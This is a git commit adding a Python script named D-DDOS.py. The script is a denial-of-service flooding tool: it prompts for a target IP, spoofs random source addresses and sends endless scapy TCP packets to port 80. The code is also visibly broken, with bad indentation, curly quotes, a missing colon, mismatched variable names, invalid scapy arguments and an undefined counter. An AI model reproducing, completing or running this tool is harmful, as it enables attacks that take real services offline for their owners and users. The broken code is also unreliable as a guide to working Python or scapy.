0dd037dccfbe3c244ea9982a302302a42e172bf9
medalyDragon <55749048+medalyDragon@users.noreply.github.com>
2019-09-25 13:21:01 +0000

    Update and rename M-Tools.py to D-DDOS.py

---
+++ D-DDOS.py
@@ -0,0 +1,35 @@
+#Dragon-DDos
+import random
+from scapy.all import *
+	logo= (''' 
+	
+ ____                                    ____  ____
+|  _ \ _ __ __ _  __ _  ___  _ __       |  _ \|  _ \  ___  ___
+| | | | '__/ _` |/ _` |/ _ \| '_ \ _____| | | | | | |/ _ \/ __|
+| |_| | | | (_| | (_| | (_) | | | |_____| |_| | |_| | (_) \__ \
+|____/|_|  \__,_|\__, |\___/|_| |_|     |____/|____/ \___/|___/
+                 |___/
+
+by Mohamed Aly Sidi Mohamed
+             ''')
+print"logo"
+
+print"-------------------------------------------"
+target_IP = input("Enter IP address of Target:| ")
+print"--------------------------------------------"
+while True:
+   a = str(random.randint(1,254))
+   b = str(random.randint(1,254))
+   c = str(random.randint(1,254))
+   d = str(random.randint(1,254))
+   dot = “.”
+   Source_ip = a + dot + b + dot + c + dot + d
+  
+   for source_port in range(1, 65535)
+      IP1 = IP(source_IP = source_IP, destination = target_IP)
+      TCP1 = TCP(srcport = source_port, dstport = 80)
+      pkt = IP1 / TCP1
+      send(pkt,inter = .001)
+    
+      print ("packet sent ", i)
+         i = i + 1
